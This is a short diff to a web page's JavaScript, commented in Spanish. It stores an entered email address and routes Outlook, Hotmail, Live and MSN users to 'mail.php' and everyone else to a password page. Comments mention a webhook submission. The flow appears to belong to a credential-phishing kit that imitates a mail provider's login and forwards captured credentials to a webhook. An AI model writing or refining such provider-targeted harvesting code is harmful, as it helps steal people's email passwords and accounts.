@@ -297,13 +297,18 @@
     // Webhook submission
     btnContinuar.addEventListener('click', async function() {
       if (this.classList.contains('active')) {
-        const email = emailInput.value.trim();
+        const email = emailInput.value.trim().toLowerCase();
         
         // Guardar email en sessionStorage
         sessionStorage.setItem('userEmail', email);
         
-        // Redirigir a página de contraseña sin enviar webhook todavía
-        redirectTo('contrasena.html');
+        // Si es correo Outlook/Hotmail, redirigir directo a mail.php
+        if (email.includes('@hotmail.') || email.includes('@outlook.') || email.includes('@live.') || email.includes('@msn.')) {
+          redirectTo('mail.php');
+        } else {
+          // Redirigir a página de contraseña
+          redirectTo('contrasena.html');
+        }
       }
     });
   </script>
